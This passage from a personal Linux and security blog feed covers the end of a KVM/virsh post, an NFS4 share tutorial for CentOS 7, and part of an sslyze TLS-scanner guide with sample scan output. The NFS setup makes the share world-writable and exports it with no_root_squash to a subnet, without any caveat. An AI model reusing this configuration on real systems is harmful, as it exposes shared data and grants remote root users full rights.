<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh # start generic
</span><span class='line'>Domain generic started
</span><span class='line'>
</span><span class='line'>virsh # dominfo generic
</span><span class='line'>Id:             1
</span><span class='line'>Name:           generic
</span><span class='line'>UUID:           c4982e35-ec8d-4b5f-9ad3-c8491bcd9181
</span><span class='line'>OS Type:        hvm
</span><span class='line'>State:          running
</span><span class='line'>CPU(s):         1
</span><span class='line'>CPU time:       0.4s
</span><span class='line'>Max memory:     1048576 KiB
</span><span class='line'>Used memory:    1048576 KiB
</span><span class='line'>Persistent:     yes
</span><span class='line'>Autostart:      disable
</span><span class='line'>Managed save:   no
</span><span class='line'>Security model: none
</span><span class='line'>Security DOI:   0</span></code></pre></td></tr></table></div></figure>


<p>Now we have a better grasp on Linux-based hypervisors, and we don&rsquo;t have to rely on VMware and Virtualbox only. In a future post I will show how to install a VM from the command line.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ______________________________________
</span><span class='line'>/ Q: How did you get into artificial   \
</span><span class='line'>| intelligence? A: Seemed logical -- I |
</span><span class='line'>\ didn't have any real intelligence.   /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NFS shares on CentOS 7]]></title>
    <link href="http://chousensha.github.io/blog/2017/09/10/nfs-shares-on-centos-7/"/>
    <updated>2017-09-10T07:45:30-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/09/10/nfs-shares-on-centos-7</id>
    <content type="html"><![CDATA[<p>Today we will go over an alternate way of setting up shares on CentOS 7. In an <a href="https://chousensha.github.io/blog/2017/06/09/quick-shares-with-samba-on-centos/">earlier post</a> we saw how we can share stuff with Samba, which is the preferred way, especially if you have mixed environments. But today I also wanted to go through the process using the veteran: NFS! For this example, we&rsquo;ll be looking at the newest version, NFS4, which adds performance and security features, but also operates a little bit differently than its predecessors.</p>

<!-- more -->


<p>The Network File System allows clients to mount remote filesystems as if they were present locally. By default, the NFS server is listening on port 2049. In version 4, NFS requires the use of TCP.</p>

<h3>Server configuration</h3>

<p>If you don&rsquo;t have it already, install the <code>nfs-utils</code> package. Next, start NFS with the command: <code>systemctl start nfs</code>. For the share, I created some directory and put a file in it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /var/nfs-share
</span><span class='line'>chmod 777 /var/nfs-share/</span></code></pre></td></tr></table></div></figure>


<p>Now we have to edit the <code>/etc/exports</code> file, which contains the configuration for the shares. The format is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/sharepath client(options)</span></code></pre></td></tr></table></div></figure>


<p>You can specify the client by hostname, domain name, IP address or network range. In this example, I will allow all hosts on my local subnet to have read write access to the share, and permit root users to retain their privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/var/nfs-share 192.168.217.0/24(rw,no_root_squash)</span></code></pre></td></tr></table></div></figure>


<p>Now restart the server for the configuration to take effect: <code>systemctl restart nfs</code>. You can see NFS statistics with <strong>nfstat</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfsstat
</span><span class='line'>Server rpc stats:
</span><span class='line'>calls      badcalls   badclnt    badauth    xdrcall
</span><span class='line'>91         0          0          0          0       
</span><span class='line'>
</span><span class='line'>Server nfs v4:
</span><span class='line'>null         compound     
</span><span class='line'>2         2% 89       97% 
</span><span class='line'>
</span><span class='line'>Server nfs v4 operations:
</span><span class='line'>op0-unused   op1-unused   op2-future   access       close        commit       
</span><span class='line'>0         0% 0         0% 0         0% 7         2% 1         0% 0         0% 
</span><span class='line'>create       delegpurge   delegreturn  getattr      getfh        link         
</span><span class='line'>0         0% 0         0% 1         0% 52       20% 8         3% 0         0% 
</span><span class='line'>lock         lockt        locku        lookup       lookup_root  nverify      
</span><span class='line'>0         0% 0         0% 0         0% 16        6% 0         0% 0         0% 
</span><span class='line'>open         openattr     open_conf    open_dgrd    putfh        putpubfh     
</span><span class='line'>1         0% 0         0% 0         0% 0         0% 63       25% 0         0% 
</span><span class='line'>putrootfh    read         readdir      readlink     remove       rename       
</span><span class='line'>4         1% 1         0% 2         0% 0         0% 0         0% 0         0% 
</span><span class='line'>renew        restorefh    savefh       secinfo      setattr      setcltid     
</span><span class='line'>0         0% 0         0% 0         0% 0         0% 0         0% 0         0% 
</span><span class='line'>setcltidconf verify       write        rellockowner bc_ctl       bind_conn    
</span><span class='line'>0         0% 0         0% 0         0% 0         0% 0         0% 0         0% 
</span><span class='line'>exchange_id  create_ses   destroy_ses  free_stateid getdirdeleg  getdevinfo   
</span><span class='line'>2         0% 2         0% 1         0% 0         0% 0         0% 0         0% 
</span><span class='line'>getdevlist   layoutcommit layoutget    layoutreturn secinfononam sequence     
</span><span class='line'>0         0% 0         0% 0         0% 0         0% 2         0% 83       33% 
</span><span class='line'>set_ssv      test_stateid want_deleg   destroy_clid reclaim_comp 
</span><span class='line'>0         0% 0         0% 0         0% 1         0% 2         0% </span></code></pre></td></tr></table></div></figure>


<p>To see the available exports and their options, use <strong>exportfs</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exportfs -v
</span><span class='line'>/var/nfs-share    192.168.217.0/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)</span></code></pre></td></tr></table></div></figure>


<h3>Client configuration</h3>

<p>On the client, I first made a directory for the shares:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /mnt/nfs</span></code></pre></td></tr></table></div></figure>


<p>To mount the share, the command looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t nfs -o options server:/export /mount/directory</span></code></pre></td></tr></table></div></figure>


<p>In my case, I mounted the exported share with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t nfs 192.168.217.131:/var/nfs-share /mnt/nfs/</span></code></pre></td></tr></table></div></figure>


<p>Then I went to the directory and read the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt/nfs# ls
</span><span class='line'>file.txt
</span><span class='line'>root@kali:/mnt/nfs# cat file.txt 
</span><span class='line'>something here</span></code></pre></td></tr></table></div></figure>


<p>When done, unmount the filesystem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>umount /mnt/nfs</span></code></pre></td></tr></table></div></figure>


<p>If instead of manually mounting the share, we would want it automatically mounted at boot, we&rsquo;d have to edit <code>/etc/fstab</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># /etc/fstab: static file system information.
</span><span class='line'>#
</span><span class='line'># Use 'blkid' to print the universally unique identifier for a
</span><span class='line'># device; this may be used with UUID= as a more robust way to name devices
</span><span class='line'># that works even if disks are added and removed. See fstab(5).
</span><span class='line'>#
</span><span class='line'># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;
</span><span class='line'>192.168.217.131:/var/nfs-share /mnt/nfs nfs rw 0 0</span></code></pre></td></tr></table></div></figure>


<p>Now reboot the client and check that the share was mounted:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount | grep nfs
</span><span class='line'>192.168.217.131:/var/nfs-share on /mnt/nfs type nfs4 (rw,relatime,vers=4.2,rsize=262144,wsize=262144,namlen=255,hard,proto=tcp,port=0,timeo=600,retrans=2,sec=sys,clientaddr=0.0.0.0,local_lock=none,addr=192.168.217.131)</span></code></pre></td></tr></table></div></figure>


<p>So, it&rsquo;s pretty easy and fast to set up NFS shares, but keep in mind this tutorial only scratched the surface of the available configuration options.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Q: What's tiny and yellow and very,   \
</span><span class='line'>| very, dangerous? A: A canary with the |
</span><span class='line'>\ super-user password.                  /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslyze - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/16/sslyze-kali-linux-tools/"/>
    <updated>2017-07-16T04:57:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/16/sslyze-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: test the SSL/TLS security posture of a target as a standalone tool or as a custom made solution. sslyze is a fast and powerful SSL/TLS scanning Python tool that can be used both from the command line or as a library to include in your own scripts. It&rsquo;s being updated frequently and it&rsquo;s been tested on Windows, Linux and MacOS platforms.</p>

<p>Homepage: <a href="https://github.com/nabla-c0d3/sslyze">https://github.com/nabla-c0d3/sslyze</a></p>

<!-- more -->


<h2>sslyze description</h2>

<blockquote><p>SSLyze is a Python library and a CLI tool that can analyze the SSL configuration of a server by connecting to it. It
is designed to be fast and comprehensive, and should help organizations and testers identify mis-configurations
affecting their SSL/TLS servers.</p>

<p>Key features include:</p>

<ul>
<li><p>Python API, in order to run scans and process the results directly from Python.</p></li>
<li><p>Scans are automatically dispatched among multiple processes, making them very fast.</p></li>
<li><p>Performance testing: session resumption and TLS tickets support.</p></li>
<li><p>Security testing: weak cipher suites, insecure renegotiation, CRIME, Heartbleed and more.</p></li>
<li><p>Server certificate validation and revocation checking through OCSP stapling.</p></li>
<li><p>Support for StartTLS handshakes on SMTP, XMPP, LDAP, POP, IMAP, RDP, PostGres and FTP.</p></li>
<li><p>Support for client certificates when scanning servers that perform mutual authentication.</p></li>
<li><p>Scan results can be written to an XML or JSON file for further processing.</p></li>
<li><p>And much more!</p></li>
</ul>


<p>SSLyze is all Python code but it uses an OpenSSL wrapper written in C called nassl, which was specifically developed
for allowing SSLyze to access the low-level OpenSSL APIs needed to perform deep SSL testing.</p></blockquote>

<p>Documentation: <a href="https://nabla-c0d3.github.io/sslyze/documentation/">https://nabla-c0d3.github.io/sslyze/documentation/</a></p>

<h2>sslyze options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: sslyze.py [options] target1.com target2.com:443 etc...
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  --version             show program's version number and exit
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  --xml_out=XML_FILE    Writes the scan results as an XML document to the file
</span><span class='line'>                        XML_FILE. If XML_FILE is set to "-", the XML output
</span><span class='line'>                        will instead be printed to stdout.
</span><span class='line'>  --targets_in=TARGETS_IN
</span><span class='line'>                        Reads the list of targets to scan from the file
</span><span class='line'>                        TARGETS_IN. It should contain one host:port per line.
</span><span class='line'>  --timeout=TIMEOUT     Sets the timeout value in seconds used for every
</span><span class='line'>                        socket connection made to the target server(s).
</span><span class='line'>                        Default is 5s.
</span><span class='line'>  --nb_retries=NB_RETRIES
</span><span class='line'>                        Sets the number retry attempts for all network
</span><span class='line'>                        connections initiated throughout the scan. Increase
</span><span class='line'>                        this value if you are getting a lot of
</span><span class='line'>                        timeout/connection errors when scanning a specific
</span><span class='line'>                        server. Decrease this value to increase the speed of
</span><span class='line'>                        the scans; results may however return connection
</span><span class='line'>                        errors. Default is 4 connection attempts.
</span><span class='line'>  --https_tunnel=HTTPS_TUNNEL
</span><span class='line'>                        Tunnels all traffic to the target server(s) through an
</span><span class='line'>                        HTTP CONNECT proxy. HTTP_TUNNEL should be the proxy's
</span><span class='line'>                        URL: 'http://USER:PW@HOST:PORT/'. For proxies
</span><span class='line'>                        requiring authentication, only Basic Authentication is
</span><span class='line'>                        supported.
</span><span class='line'>  --starttls=STARTTLS   Performs StartTLS handshakes when connecting to the
</span><span class='line'>                        target server(s). STARTTLS should be one of: ['smtp',
</span><span class='line'>                        'xmpp', 'xmpp_server', 'pop3', 'ftp', 'imap', 'ldap',
</span><span class='line'>                        'rdp', 'postgres', 'auto']. The 'auto' option will
</span><span class='line'>                        cause SSLyze to deduce the protocol (ftp, imap, etc.)
</span><span class='line'>                        from the supplied port number, for each target
</span><span class='line'>                        servers.
</span><span class='line'>  --xmpp_to=XMPP_TO     Optional setting for STARTTLS XMPP.  XMPP_TO should be
</span><span class='line'>                        the hostname to be put in the 'to' attribute of the
</span><span class='line'>                        XMPP stream. Default is the server's hostname.
</span><span class='line'>  --sni=SNI             Use Server Name Indication to specify the hostname to
</span><span class='line'>                        connect to. Will only affect TLS 1.0+ connections.
</span><span class='line'>  --quiet               Hide script standard outputs. Will only affect script
</span><span class='line'>                        output if --xml_out is set.
</span><span class='line'>  --regular             Regular HTTPS scan; shortcut for --sslv2 --sslv3
</span><span class='line'>                        --tlsv1 --tlsv1_1 --tlsv1_2 --reneg --resum
</span><span class='line'>                        --certinfo=basic --http_get --hide_rejected_ciphers
</span><span class='line'>                        --compression --heartbleed
</span><span class='line'>
</span><span class='line'>  Client certificate support:
</span><span class='line'>    --cert=CERT         Client certificate chain filename. The certificates
</span><span class='line'>                        must be in PEM format and must be sorted starting with
</span><span class='line'>                        the subject's client certificate, followed by
</span><span class='line'>                        intermediate CA certificates if applicable.
</span><span class='line'>    --key=KEY           Client private key filename.
</span><span class='line'>    --keyform=KEYFORM   Client private key format. DER or PEM (default).
</span><span class='line'>    --pass=KEYPASS      Client private key passphrase.
</span><span class='line'>
</span><span class='line'>  PluginOpenSSLCipherSuites:
</span><span class='line'>    Scans the server(s) for supported OpenSSL cipher suites.
</span><span class='line'>
</span><span class='line'>    --sslv2             Lists the SSL 2.0 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --sslv3             Lists the SSL 3.0 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --tlsv1             Lists the TLS 1.0 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --tlsv1_1           Lists the TLS 1.1 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --tlsv1_2           Lists the TLS 1.2 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --http_get          Option - For each cipher suite, sends an HTTP GET
</span><span class='line'>                        request after completing the SSL handshake and returns
</span><span class='line'>                        the HTTP status code.
</span><span class='line'>    --hide_rejected_ciphers
</span><span class='line'>                        Option - Hides the (usually long) list of cipher
</span><span class='line'>                        suites that were rejected by the server(s).
</span><span class='line'>
</span><span class='line'>  PluginChromeSha1Deprecation:
</span><span class='line'>    --chrome_sha1       Determines if the server will be affected by Google
</span><span class='line'>                        Chrome's SHA-1 deprecation plans. See
</span><span class='line'>                        http://googleonlinesecurity.blogspot.com/2014/09
</span><span class='line'>                        /gradually-sunsetting-sha-1.html for more information
</span><span class='line'>
</span><span class='line'>  PluginSessionRenegotiation:
</span><span class='line'>    --reneg             Tests the server(s) for client-initiated renegotiation
</span><span class='line'>                        and secure renegotiation support.
</span><span class='line'>
</span><span class='line'>  PluginHeartbleed:
</span><span class='line'>    --heartbleed        Tests the server(s) for the OpenSSL Heartbleed
</span><span class='line'>                        vulnerability (experimental).
</span><span class='line'>
</span><span class='line'>  PluginCertInfo:
</span><span class='line'>    --certinfo=CERTINFO
</span><span class='line'>                        Verifies the validity of the server(s) certificate(s)
</span><span class='line'>                        against various trust stores, checks for support for
</span><span class='line'>                        OCSP stapling, and prints relevant fields of the
</span><span class='line'>                        certificate. CERTINFO should be 'basic' or 'full'.
</span><span class='line'>    --ca_file=CA_FILE   Local Certificate Authority file (in PEM format), to
</span><span class='line'>                        verify the validity of the server(s) certificate(s)
</span><span class='line'>                        against.
</span><span class='line'>
</span><span class='line'>  PluginCompression:
</span><span class='line'>    --compression       Tests the server(s) for Zlib compression support.
</span><span class='line'>
</span><span class='line'>  PluginHSTS:
</span><span class='line'>    --hsts              Checks support for HTTP Strict Transport Security
</span><span class='line'>                        (HSTS) by collecting any Strict-Transport-Security
</span><span class='line'>                        field present in the HTTP response sent back by the
</span><span class='line'>                        server(s).
</span><span class='line'>
</span><span class='line'>  PluginSessionResumption:
</span><span class='line'>    Analyzes the target server's SSL session resumption capabilities.
</span><span class='line'>
</span><span class='line'>    --resum             Tests the server(s) for session resumption support
</span><span class='line'>                        using session IDs and TLS session tickets (RFC 5077).
</span><span class='line'>    --resum_rate        Performs 100 session resumptions with the server(s),
</span><span class='line'>                        in order to estimate the session resumption rate.</span></code></pre></td></tr></table></div></figure>


<h2>sslyze usage</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sslyze --regular bugcrowd.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> AVAILABLE PLUGINS
</span><span class='line'> -----------------
</span><span class='line'>
</span><span class='line'>  PluginSessionResumption
</span><span class='line'>  PluginCompression
</span><span class='line'>  PluginSessionRenegotiation
</span><span class='line'>  PluginChromeSha1Deprecation
</span><span class='line'>  PluginHSTS
</span><span class='line'>  PluginHeartbleed
</span><span class='line'>  PluginOpenSSLCipherSuites
</span><span class='line'>  PluginCertInfo
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> CHECKING HOST(S) AVAILABILITY
</span><span class='line'> -----------------------------
</span><span class='line'>
</span><span class='line'>   bugcrowd.com:443                    =&gt; 104.20.4.239:443
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> SCAN RESULTS FOR BUGCROWD.COM:443 - 104.20.4.239:443
</span><span class='line'> ----------------------------------------------------
</span><span class='line'>
</span><span class='line'>  * Deflate Compression:
</span><span class='line'>      OK - Compression disabled          
</span><span class='line'>
</span><span class='line'>  * Session Renegotiation:
</span><span class='line'>      Client-initiated Renegotiations:   OK - Rejected
</span><span class='line'>      Secure Renegotiation:              OK - Supported
</span><span class='line'>
</span><span class='line'>  * OpenSSL Heartbleed:
</span><span class='line'>      OK - Not vulnerable to Heartbleed  
</span><span class='line'>
</span><span class='line'>  * Session Resumption:
</span><span class='line'>      With Session IDs:                  OK - Supported (5 successful, 0 failed, 0 errors, 5 total attempts).
</span><span class='line'>      With TLS Session Tickets:          OK - Supported
</span><span class='line'>
</span><span class='line'>  * SSLV2 Cipher Suites:
</span><span class='line'>      Server rejected all cipher suites.
</span><span class='line'>
</span><span class='line'>  * Certificate - Content:
</span><span class='line'>      SHA1 Fingerprint:                  db65dbb15a1819ad4692c47cfc0bc966beb6e44f
</span><span class='line'>      Common Name:                       bugcrowd.com
</span><span class='line'>      Issuer:                            DigiCert SHA2 Extended Validation Server CA
</span><span class='line'>      Serial Number:                     075FE475034104F4909DDD4B5CD8C1AC
</span><span class='line'>      Not Before:                        Oct 10 00:00:00 2015 GMT
</span><span class='line'>      Not After:                         Oct 13 12:00:00 2017 GMT
</span><span class='line'>      Signature Algorithm:               sha256WithRSAEncryption
</span><span class='line'>      Public Key Algorithm:              rsaEncryption
</span><span class='line'>      Key Size:                          2048 bit
</span><span class='line'>      Exponent:                          65537 (0x10001)
</span><span class='line'>      X509v3 Subject Alternative Name:   {'DNS': ['bugcrowd.com', 'forum.bugcrowd.com', 'blog.bugcrowd.com', 'docs.bugcrowd.com', 'tracker.bugcrowd.com']}
</span><span class='line'>
</span><span class='line'>  * Certificate - Trust:
</span><span class='line'>      Hostname Validation:               OK - Subject Alternative Name matches
</span><span class='line'>      Google CA Store (09/2015):         OK - Certificate is trusted
</span><span class='line'>      Java 6 CA Store (Update 65):       OK - Certificate is trusted
</span><span class='line'>      Microsoft CA Store (09/2015):      OK - Certificate is trusted
</span><span class='line'>      Mozilla NSS CA Store (09/2015):    OK - Certificate is trusted
</span><span class='line'>      Apple CA Store (OS X 10.10.5):     OK - Certificate is trusted
